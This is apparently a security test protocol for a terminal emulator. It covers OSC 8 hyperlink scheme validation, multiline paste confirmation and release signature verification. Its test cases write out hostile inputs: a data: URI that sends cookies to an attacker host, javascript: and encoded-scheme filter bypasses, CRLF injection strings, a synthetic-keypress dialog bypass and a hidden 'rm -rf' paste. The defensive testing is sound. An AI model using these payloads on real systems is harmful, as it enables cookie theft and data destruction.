# Security Test Protocol — Minor Sprint 2026-04-05

Version: 1.0 — 2026-04-05
Scope: Linux (x86, x86_64, ARM32, ARM64, RISC-V) — v1 only
Author role: security-expert

---

## Relation to the Primary Protocol

This document is a focused extension of `security-pty-ipc-ssh-credentials-csp-osc52.md`. It covers the security dimensions of three features from the minor sprint of 2026-04-05 that were not addressed in the primary protocol:

- **FS-VT-073** — OSC 8 URI scheme validation (deeper attack vectors beyond SEC-PATH-003/SEC-PATH-004)
- **FS-CLIP-009** — Multiline paste confirmation (new attack surface)
- **FS-DIST-006** — Release artefact GPG signature verification (supply-chain integrity)

Scenarios are numbered `SEC-MIN-001` through `SEC-MIN-013` to avoid collision with the primary protocol's `SEC-*` namespace.

Cross-references to existing scenarios are noted explicitly where a new scenario extends rather than duplicates prior coverage.

---

## Table of Contents

1. [FS-VT-073 — OSC 8 URI Scheme Validation (Ingestion Layer)](#1-fs-vt-073--osc-8-uri-scheme-validation-ingestion-layer)
2. [FS-CLIP-009 — Multiline Paste Confirmation](#2-fs-clip-009--multiline-paste-confirmation)
3. [FS-DIST-006 — Release Artefact Signature Verification](#3-fs-dist-006--release-artefact-signature-verification)
4. [Stub Dependencies](#4-stub-dependencies)

---

## 1. FS-VT-073 — OSC 8 URI Scheme Validation (Ingestion Layer)

### Scope clarification

SEC-PATH-003 and SEC-PATH-004 (primary protocol) test the `validate_url_scheme()` function inside `open_url()` — the path taken when the user Ctrl+Clicks a hyperlink. They verify that dangerous URIs are rejected at the *opening* stage.

The scenarios below address a distinct, earlier attack surface: the *ingestion* of the OSC 8 sequence in `VtProcessor::process()` / `parse_osc()`. A dangerous URI that is stored in the `ScreenBuffer` as a hyperlink attribute — even if never opened — can still expose attack surface: it may be serialized into IPC events, rendered in a hover tooltip, or influence accessibility trees. The correct defence is to reject dangerous URIs at parse time, before they enter any application state.

### SEC-MIN-001

| Field | Value |
|-------|-------|
| **ID** | SEC-MIN-001 |
| **Feature reference** | FS-VT-073 |
| **STRIDE** | Tampering |
| **Threat** | A malicious process emits an OSC 8 hyperlink whose URI uses the `javascript:` scheme: `\x1b]8;;javascript:alert(document.cookie)\x1b\\click\x1b]8;;\x1b\\`. The URI is accepted by the VtProcessor, stored in the screen buffer, and surfaced in a hover tooltip or serialized to the frontend. Even if `open_url()` later rejects the URI on click, the stored URI is accessible to any renderer code that calls `window.open()` or `href` assignment. |
| **Attack vector** | PTY output stream → `VtProcessor::process()` → `parse_osc()` → `OscAction::SetHyperlink` with a `javascript:` URI stored in `ScreenBuffer`. |
| **Steps** | 1. Feed `\x1b]8;;javascript:alert(1)\x1b\\` to `VtProcessor::process()`. 2. Inspect the resulting `OscAction` or `ScreenBuffer` cell hyperlink attribute. 3. Assert that no hyperlink attribute with a `javascript:` URI was written to the screen buffer — the sequence must produce either `OscAction::Ignore` or an `OscAction::SetHyperlink` with an empty/cleared URI. |
| **Expected result** | `parse_osc()` rejects the URI at parse time. No cell in `ScreenBuffer` carries a `javascript:` URI as a hyperlink attribute. No `HyperlinkHoverEvent` is emitted with a dangerous scheme. |
| **Pass/Fail criteria** | PASS: no `javascript:` URI stored or emitted. FAIL: any code path stores or forwards the URI. |
| **Severity** | Critical |

---

### SEC-MIN-002

| Field | Value |
|-------|-------|
| **ID** | SEC-MIN-002 |
| **Feature reference** | FS-VT-073 |
| **STRIDE** | Information Disclosure |
| **Threat** | An OSC 8 URI uses the `data:` scheme: `data:text/html,<script>fetch('https://attacker.example/'+document.cookie)</script>`. If stored and later opened by any renderer path (e.g., tooltip preview opens a data URL in a WebView iframe), it exfiltrates application state. |
| **Attack vector** | Same as SEC-MIN-001 but with `data:text/html,...` as the URI. |
| **Steps** | 1. Feed `\x1b]8;;data:text/html,<script>alert(1)</script>\x1b\\` to `VtProcessor::process()`. 2. Assert the URI is rejected at parse time (no storage in screen buffer). 3. Also test `data:application/javascript,...` and `data:image/svg+xml,...` variants. |
| **Expected result** | All `data:` URIs are rejected at ingestion. No variant is stored in the screen buffer. |
| **Pass/Fail criteria** | PASS: `OscAction::Ignore` (or equivalent discard) for all `data:` variants. FAIL: any `data:` URI stored in any cell attribute. |
| **Severity** | High |

---

### SEC-MIN-003

| Field | Value |
|-------|-------|
| **ID** | SEC-MIN-003 |
| **Feature reference** | FS-VT-073 |
| **STRIDE** | Information Disclosure |
| **Threat** | A malicious SSH server sends an OSC 8 hyperlink with a `file://` URI: `\x1b]8;;file:///etc/passwd\x1b\\`. FS-VT-073 forbids `file://` in SSH sessions. If accepted and stored, the URI may be opened via a keybinding or tooltip interaction, disclosing local file content to an attacker who controls the SSH output stream. Note: SEC-PATH-004 tests the `open_url()` rejection; this scenario tests that the URI is also rejected at VtProcessor ingestion for SSH sessions specifically. |
| **Attack vector** | SSH PTY channel output → `VtProcessor::process()` → OSC 8 handler with session-type context. |
| **Steps** | 1. Construct a `VtProcessor` configured with session type SSH. 2. Feed `\x1b]8;;file:///etc/passwd\x1b\\`. 3. Assert no `file://` URI is stored in the screen buffer for an SSH session. 4. Contrast: construct a `VtProcessor` with session type Local PTY. Feed the same sequence. Per FS-VT-073, `file://` is permitted in local sessions only — assert the URI IS stored (no rejection) for the local case, confirming the session-type gating works correctly in both directions. |
| **Expected result** | SSH session: `file://` URI is rejected at ingestion. Local session: `file://` URI is stored (permissible per FS-VT-073). |
| **Pass/Fail criteria** | PASS: correct per-session-type behaviour in both cases. FAIL: `file://` stored in SSH session, or rejected in local session (over-blocking). |
| **Severity** | High |
| **Note** | Extends SEC-PATH-004, which only tests `open_url()`. This scenario tests the earlier rejection at the VtProcessor parse layer. |

---

### SEC-MIN-004

| Field | Value |
|-------|-------|
| **ID** | SEC-MIN-004 |
| **Feature reference** | FS-VT-073 |
| **STRIDE** | Denial of Service |
| **Threat** | A malicious process emits an OSC 8 sequence with a URI of 2049 characters or more. Per FS-VT-073, URIs exceeding 2048 characters must be rejected. If accepted and stored, an unbounded URI string could cause excessive memory use in tooltip rendering, IPC serialization, or screen buffer serialization. Beyond that, an excessively long URI could trigger a time-of-check/time-of-use window if the validation in `open_url()` applies a different length limit than the one applied at parse time. |
| **Attack vector** | PTY output stream → `parse_osc()` OSC 8 URI field. |
| **Steps** | 1. Construct a URI of exactly 2048 characters (`https://` + 2041 `a`s) — assert it is accepted (boundary check). 2. Construct a URI of exactly 2049 characters — assert it is rejected at parse time (no storage in screen buffer). 3. Construct a URI of 100 000 characters — assert rejection, no OOM, no panic. Assert the rejection does not disturb the VtProcessor state (subsequent valid sequences are processed correctly). |
| **Expected result** | URIs of 2048 characters or fewer are accepted. URIs of 2049 characters or more are discarded at parse time. |
| **Pass/Fail criteria** | PASS: correct boundary enforcement and no instability on overflow. FAIL: a 2049-character URI is stored, or a 100 000-character URI causes panic or OOM. |
| **Severity** | Medium |
| **Note** | Distinct from SEC-PTY-003 (which covers the 4096-byte OSC sequence body limit). A URI could be exactly 2049 characters while the entire OSC body stays under 4096 bytes. Both limits must be enforced independently. |

---

### SEC-MIN-005

| Field | Value |
|-------|-------|
| **ID** | SEC-MIN-005 |
| **Feature reference** | FS-VT-073 |
| **STRIDE** | Tampering |
| **Threat** | A malicious process embeds C0 or C1 control characters inside an OSC 8 URI: e.g., `https://example.com/\x01path` or `https://evil.example/\x0d\x0aHTTP/1.1\x20200\x20OK\x0d\x0a`. Control characters in a URI can: (a) cause response splitting if the URI is logged or forwarded, (b) be used to craft visually deceptive hover tooltips, or (c) bypass naive string-matching validators that check scheme only. A null byte (`\x00`) terminates C strings in lower-level code and could cause truncation in `xdg-open` invocation. |
| **Attack vector** | PTY output stream → `parse_osc()` OSC 8 URI field containing C0/C1 bytes or null. |
| **Steps** | 1. Feed URIs containing each of the following: `\x00` (null), `\x01`, `\x07` (BEL), `\x08` (BS), `\x0a` (LF), `\x0d` (CR), `\x1b` (ESC), `\x9b` (C1 CSI lead). 2. Assert each URI is rejected at parse time (not stored). 3. Assert a URI with all C0/C1 stripped but otherwise valid (e.g., `https://example.com/path`) is accepted (confirm the check is rejection of the dirty URI, not over-broad rejection). |
| **Expected result** | Any URI containing at least one C0 or C1 character (U+0000–U+001F, U+007F–U+009F) or a null byte is rejected at ingestion. Clean URIs of the same base form are accepted. |
| **Pass/Fail criteria** | PASS: all dirty URIs rejected; clean URI accepted. FAIL: any dirty URI stored, or clean URI rejected due to over-broad check. |
| **Severity** | High |

---

### SEC-MIN-006

| Field | Value |
|-------|-------|
| **ID** | SEC-MIN-006 |
| **Feature reference** | FS-VT-073 |
| **STRIDE** | Tampering |
| **Threat** | A malicious process sends an OSC 8 URI using a case-variant of a blocked scheme: `FILE:///etc/passwd`, `JAVASCRIPT:alert(1)`, `JavaScript:alert(1)`, `fIlE:///etc/passwd`. Scheme matching that is case-sensitive and allowlist-based (e.g., checking only `"http"`, `"https"`) would accept uppercase variants, bypassing the policy. This is a common bypassing technique against naive scheme validators. |
| **Attack vector** | PTY output stream → `parse_osc()` OSC 8 URI field with mixed-case or uppercase scheme prefix. |
| **Steps** | 1. Feed `\x1b]8;;FILE:///etc/passwd\x1b\\` to `VtProcessor::process()`. Assert rejection. 2. Feed `JAVASCRIPT:alert(1)`. Assert rejection. 3. Feed `JavaScript:alert(1)`. Assert rejection. 4. Feed `HTTPS://example.com` — assert this is ACCEPTED (uppercase of an allowed scheme must not be blocked). 5. Feed `Http://example.com` — assert ACCEPTED (mixed case of allowed scheme). |
| **Expected result** | The scheme check normalises the scheme to lowercase before allowlist comparison. All case variants of blocked schemes are rejected. All case variants of allowed schemes (`http`, `https`, `mailto`, `ssh`) are accepted. |
| **Pass/Fail criteria** | PASS: `FILE://` and `JAVASCRIPT:` rejected; `HTTPS://` accepted. FAIL: any mixed-case blocked scheme accepted, or any mixed-case allowed scheme rejected. |
| **Severity** | High |

---

### SEC-MIN-007

| Field | Value |
|-------|-------|
| **ID** | SEC-MIN-007 |
| **Feature reference** | FS-VT-073 |
| **STRIDE** | Tampering |
| **Threat** | A malicious process sends a `javascript:` URI that has been percent-encoded or HTML-entity-encoded to evade scheme detection: e.g., `%6a%61%76%61%73%63%72%69%70%74:alert(1)` (URL-encoded `javascript`), or `&#106;avascript:alert(1)` (HTML entity for `j`). If the validator operates on the raw string without first decoding percent sequences or HTML entities, the encoded scheme bypasses the allowlist check. |
| **Attack vector** | PTY output stream → `parse_osc()` OSC 8 URI field with encoded scheme prefix. |
| **Steps** | 1. Feed `\x1b]8;;%6a%61%76%61%73%63%72%69%70%74:alert(1)\x1b\\`. Assert rejected. 2. Feed `\x1b]8;;&#106;avascript:alert(1)\x1b\\`. Assert rejected. 3. Feed `\x1b]8;;j\x61vascript:alert(1)\x1b\\` (literal `\x61` = `a` — already ASCII, but confirms no partial decoding). Assert rejected. 4. Verify that `https://example.com/%6a%61%76%61` (percent-encoding in the path, not the scheme) is accepted — the scheme `https` is unencoded and valid. |
| **Expected result** | The validator operates on the *parsed* scheme extracted after URI normalisation. Encoded scheme prefixes do not bypass the allowlist. Percent-encoded paths in valid-scheme URIs are unaffected. |
| **Pass/Fail criteria** | PASS: all encoded-scheme variants rejected; percent-encoded path in valid URI accepted. FAIL: any encoded `javascript:` or `file:` variant is stored or forwarded. |
| **Severity** | Critical |
| **Note** | This is the most critical scenario in the FS-VT-073 group. Validation must be applied on the *parsed* scheme component (RFC 3986 §3.1), not on the raw URI string. The URI parser must decode percent-encoding in the scheme before comparison, and must reject HTML entity sequences in URIs entirely (HTML entities have no meaning in URI syntax and indicate injection). |

---

## 2. FS-CLIP-009 — Multiline Paste Confirmation

### Scope clarification

FS-CLIP-008 (bracketed paste mode) is primarily a functional requirement with a security sub-requirement (stripping the `ESC [201~` end sequence to prevent premature termination). That sub-requirement is functional in nature and is already covered by the VtProcessor fuzzing target (SEC-PTY-008).

FS-CLIP-009 governs paste behaviour when bracketed paste mode is NOT active. In this mode, pasted text is sent to the PTY directly, without the bracketed paste wrappers. The presence of newlines means each line is sent as if the user typed it followed by Enter — shell commands execute immediately. The confirmation dialog required by FS-CLIP-009 is the only barrier between a paste action and command execution.

The scenarios below address attacks against this barrier.

---

### SEC-MIN-008

| Field | Value |
|-------|-------|
| **ID** | SEC-MIN-008 |
| **Feature reference** | FS-CLIP-009 |
| **STRIDE** | Tampering |
| **Threat** | Clipboard poisoning: a user copies content from a webpage, document, or another application that contains hidden newlines. Without the confirmation dialog, pasting into a terminal with bracketed paste OFF causes all lines to execute immediately. For example, a user copies what appears to be a single-line command; the actual clipboard content is `ls\nrm -rf ~/important-data\n`. The multi-command sequence executes without any visible indication before the second command runs. The confirmation dialog must be shown before any bytes are written to the PTY. |
| **Attack vector** | System clipboard contains content with `\n` characters. User triggers paste (Ctrl+Shift+V or middle-click). Bracketed paste mode (DECSET 2004) is OFF in the active pane. |
| **Steps** | 1. Ensure bracketed paste mode is OFF in the test pane (verify `VtProcessor` state: `dec_mode_2004 = false`). 2. Place multiline content in the clipboard: `cmd1\ncmd2\ncmd3`. 3. Trigger the paste action via `invoke('paste_to_pane', { paneId })` or the UI paste path. 4. Assert that NO bytes are written to the PTY master before the confirmation dialog is shown. 5. Assert the confirmation dialog is displayed listing the number of lines or showing a preview of the content. 6. Confirm in the dialog. Assert `cmd1\ncmd2\ncmd3` is written to the PTY. 7. Cancel in the dialog. Assert nothing is written to the PTY. |
| **Expected result** | The confirmation dialog is displayed before any PTY write. Confirming sends the content; cancelling discards it. No partial write occurs (the first line must not be sent while the dialog waits). |
| **Pass/Fail criteria** | PASS: zero PTY bytes written before dialog dismissal; full content sent on confirm; zero bytes sent on cancel. FAIL: any bytes sent before confirmation, or first line sent while dialog is open. |
| **Severity** | High |

---

### SEC-MIN-009

| Field | Value |
|-------|-------|
| **ID** | SEC-MIN-009 |
| **Feature reference** | FS-CLIP-009 |
| **STRIDE** | Tampering |
| **Threat** | Dialog bypass via synthetic keyboard events: a malicious script running in the WebView (or a compromised dependency) programmatically dispatches a `KeyboardEvent` for `Enter` or `Space` immediately after the confirmation dialog opens, causing the dialog to auto-confirm without user awareness. This is a classic clickjacking / event injection pattern. If the dialog is implemented as a Svelte modal reacting to DOM keyboard events without focus isolation, this bypass is trivial. |
| **Attack vector** | JavaScript in the WebView dispatches `new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })` on the document element while the paste confirmation dialog is rendering. |
| **Steps** | 1. Trigger the paste confirmation dialog (as in SEC-MIN-008). 2. From the browser devtools console (or a test script), dispatch a synthetic `KeyboardEvent` for `Enter` targeted at `document.body`. 3. Assert the dialog does NOT auto-confirm (the synthetic event is not treated as user confirmation). 4. Separately, verify that a real Enter keypress on the focused confirm button DOES confirm the dialog (synthetic vs. real event discrimination is not required; focus isolation is sufficient). |
| **Expected result** | The confirmation dialog requires the user to explicitly interact with its own interactive elements (button click or keyboard navigation within the focused dialog). A keyboard event dispatched outside the dialog's interactive scope has no effect on the dialog state. |
| **Pass/Fail criteria** | PASS: synthetic event on document body does not confirm dialog. FAIL: dialog auto-confirms on any synthetic event dispatched at the document level. |
| **Severity** | High |
| **Note** | This is primarily a frontend (Svelte) concern. The Bits UI dialog primitive uses a focus trap, which provides the required isolation. The test verifies that the focus trap is in effect and that the paste path uses it. If the dialog is implemented without a focus trap, this is a security finding that must be remediated before FS-CLIP-009 is declared complete. |

---

### SEC-MIN-010

| Field | Value |
|-------|-------|
| **ID** | SEC-MIN-010 |
| **Feature reference** | FS-CLIP-009, FS-CLIP-008 |
| **STRIDE** | Tampering |
| **Threat** | Escape sequence injection via paste: the clipboard contains text that includes VT escape sequences (e.g., `\x1b[A` — cursor up, or `\x1b[31m` — colour escape). In legacy paste mode (bracketed paste OFF), these bytes are sent to the PTY application. While this is expected behavior (legacy mode makes no guarantee against escape sequence content), the concern is whether the *TauTerm frontend* re-interprets the pasted text before forwarding it. Specifically, the confirmation dialog preview should render the escape sequences as visible escaped text (or stripped), not interpret them as formatting directives. |
| **Attack vector** | Clipboard content: `normal text\x1b[2J\x1b[H` (clear screen + home cursor sequence embedded in pasted text). User triggers paste with bracketed paste mode OFF. |
| **Steps** | 1. Place `hello\x1b[2Jworld` in the clipboard (escape sequence embedded). 2. Trigger the paste confirmation dialog. 3. Assert the dialog preview displays the content as a safe text preview — the `\x1b[2J` sequence must not cause the dialog to clear the screen or reinterpret terminal commands. It may be displayed as `\x1b[2J` (escaped), `[control sequence]` (redacted), or simply stripped from the preview. 4. Confirm the paste. Assert the raw bytes including the escape sequence are forwarded to the PTY (the PTY application receives them as-is — this is correct legacy behavior). |
| **Expected result** | The confirmation dialog preview does not interpret VT escape sequences. The preview renders safely as text. After confirmation, the raw bytes including escape sequences are forwarded unchanged to the PTY. |
| **Pass/Fail criteria** | PASS: preview is safe; PTY receives correct raw bytes after confirmation. FAIL: dialog preview interprets `\x1b[2J` and clears a screen element, OR escape sequences are stripped from the bytes forwarded to the PTY. |
| **Severity** | Medium |

---

## 3. FS-DIST-006 — Release Artefact Signature Verification

### Scope clarification

FS-DIST-006 governs the cryptographic signing of release artefacts. This is a CI/CD and release process requirement — it is not testable via unit tests in the source code. However, it has direct security implications: a user who downloads an unsigned or invalidly signed AppImage cannot verify that the binary matches the audited source. A compromised build pipeline or distribution server could serve a trojaned artefact.

The scenarios below define the manual verification procedures that MUST be documented for users, and the failure-case behaviour that MUST be confirmed before each major release.

---

### SEC-MIN-011

| Field | Value |
|-------|-------|
| **ID** | SEC-MIN-011 |
| **Feature reference** | FS-DIST-006 |
| **STRIDE** | Tampering (supply chain) |
| **Threat** | A user downloads `TauTerm-x86_64.AppImage` from a distribution mirror or a compromised download page. Without signature verification, the user cannot distinguish the authentic artefact from a trojanised one that has been modified to include a backdoor or malicious PTY hook. |
| **Attack vector** | Network interception or mirror compromise between the release server and the end user. The artefact is modified in transit or at rest on the mirror. |
| **Steps** | **Procedure — GPG signature verification (manual, per-release):** 1. Download the TauTerm public signing key from the official channel (project website or public keyserver): `gpg --keyserver keys.openpgp.org --recv-keys <KEY_ID>`. 2. Verify the key fingerprint matches the published fingerprint exactly (compare all 40 hex characters). 3. Download the AppImage and its detached signature: `TauTerm-x86_64.AppImage` and `TauTerm-x86_64.AppImage.asc`. 4. Run: `gpg --verify TauTerm-x86_64.AppImage.asc TauTerm-x86_64.AppImage`. 5. Assert the output contains `Good signature from "TauTerm Release Key <releases@tauterm.example>"` and no `WARNING: This key is not certified with a trusted signature!` unless the key is not in the user's trust chain (in which case the fingerprint match in step 2 is sufficient). |
| **Expected result** | `gpg --verify` exits 0 and prints `Good signature`. |
| **Pass/Fail criteria** | PASS: exit code 0, `Good signature` printed. FAIL: exit code non-zero, `BAD signature`, or key ID mismatch. |
| **Severity** | Critical |

---

### SEC-MIN-012

| Field | Value |
|-------|-------|
| **ID** | SEC-MIN-012 |
| **Feature reference** | FS-DIST-006 |
| **STRIDE** | Tampering (supply chain) |
| **Threat** | A user downloads the AppImage but cannot or does not verify the GPG signature. The SHA-256 checksum provides a weaker but simpler integrity check. A tampered artefact will have a different SHA-256 hash. The `SHA256SUMS` file itself must also be GPG-signed; otherwise, an attacker who replaces the AppImage can also replace the checksum file. |
| **Attack vector** | Mirror serves a modified AppImage alongside a correspondingly modified `SHA256SUMS` file (without a valid GPG signature on `SHA256SUMS`). |
| **Steps** | **Procedure — SHA-256 checksum verification (manual, per-release):** 1. Download `SHA256SUMS` and `SHA256SUMS.asc` alongside the AppImage(s). 2. Verify the signature on `SHA256SUMS` first: `gpg --verify SHA256SUMS.asc SHA256SUMS`. Assert `Good signature`. 3. Run checksum verification: `sha256sum --check SHA256SUMS`. Assert all lines print `OK`. 4. If the `SHA256SUMS.asc` is absent or invalid, the `sha256sum --check` result is untrusted — document this clearly in the release notes. **Failure-case test (performed once, against a test artefact before the first release):** 5. Modify one byte of `TauTerm-x86_64.AppImage` in a test copy. Run `sha256sum --check SHA256SUMS`. Assert the output contains `TauTerm-x86_64.AppImage: FAILED` and `sha256sum` exits non-zero. |
| **Expected result** | Unmodified artefacts: all `sha256sum --check` lines `OK`. Modified artefact: `FAILED` line and non-zero exit. |
| **Pass/Fail criteria** | PASS: clean artefacts all `OK`; tampered artefact `FAILED`. FAIL: tampered artefact `OK` (checksum not catching modification — indicates wrong hash in `SHA256SUMS`, which is a release pipeline bug). |
| **Severity** | High |

---

### SEC-MIN-013

| Field | Value |
|-------|-------|
| **ID** | SEC-MIN-013 |
| **Feature reference** | FS-DIST-006 |
| **STRIDE** | Tampering (supply chain) |
| **Threat** | The release pipeline publishes an AppImage with an invalid or mismatched GPG signature — e.g., signed with the wrong key, or the signature file was generated for a previous version of the artefact. A user who performs signature verification receives a `BAD signature` error but may proceed anyway (habit, urgency, or misunderstanding of the error). The release process must be validated to produce signatures that correctly verify before publication, and the signature must be checked as a mandatory CI gate. |
| **Attack vector** | Pipeline misconfiguration: the signing step runs on a different binary than the one that is uploaded, or the private key used to sign has been rotated without updating the published public key. |
| **Steps** | **Release pipeline validation (pre-release gate, not a user procedure):** 1. After the CI build produces `TauTerm-x86_64.AppImage` and `TauTerm-x86_64.AppImage.asc`, run the verification command as part of the CI post-build step: `gpg --verify TauTerm-x86_64.AppImage.asc TauTerm-x86_64.AppImage`. 2. Assert CI exits 0. If non-zero, block the release — do not publish. 3. Separately, verify the deliberate-failure case: replace the AppImage content with random bytes, regenerate the signature with the correct key — the signature should pass. Replace the content with random bytes WITHOUT regenerating the signature — the signature should fail. Document both outcomes as evidence that the verification step is sensitive. 4. Verify the signing key fingerprint used in CI matches the published public key fingerprint in the project documentation. |
| **Expected result** | Valid artefact + valid signature: `gpg --verify` exits 0. Valid artefact + wrong/missing signature: non-zero exit. Modified artefact + original signature: non-zero exit. All three cases must be demonstrated before the first public release. |
| **Pass/Fail criteria** | PASS: correct exit codes in all three cases, and CI gate blocks publication on non-zero. FAIL: any case produces the wrong exit code, or CI gate is absent/disabled. |
| **Severity** | Critical |

---

## 4. Stub Dependencies

The following new scenarios are blocked on features not yet implemented and cannot be executed until the stubs are promoted to full implementations. They MUST be verified before the corresponding feature is declared complete.

| Test ID | Blocked by | Required stub / condition |
|---------|------------|--------------------------|
| SEC-MIN-001, SEC-MIN-002 | OSC 8 scheme validation at ingestion | `parse_osc()` OSC 8 handler must apply scheme validation before storing the URI in `OscAction::SetHyperlink` |
| SEC-MIN-003 | Session-type context in VtProcessor | `VtProcessor` must carry session type (Local / SSH) to gate `file://` acceptance at parse time |
| SEC-MIN-004 | URI length check at ingestion | `parse_osc()` OSC 8 handler must enforce 2048-character URI limit independently of the 4096-byte OSC body limit (SEC-PTY-003) |
| SEC-MIN-005 | C0/C1 control character rejection in URI | `parse_osc()` OSC 8 handler must scan URI bytes before `OscAction::SetHyperlink` |
| SEC-MIN-006 | Case-insensitive scheme normalisation | `parse_osc()` (or `validate_url_scheme()`) must call `.to_lowercase()` on the extracted scheme before allowlist comparison |
| SEC-MIN-007 | Parsed-scheme validation (not raw string) | The URI parser must extract the scheme component per RFC 3986 and validate it after percent-decoding; HTML entity sequences must be fully rejected |
| SEC-MIN-008, SEC-MIN-009, SEC-MIN-010 | Paste confirmation dialog | `FS-CLIP-009` paste confirmation dialog and the `paste_to_pane` command path with newline detection |
| SEC-MIN-011, SEC-MIN-012, SEC-MIN-013 | Release pipeline | CI signing step (FS-DIST-006); cannot be validated until the first release pipeline run |
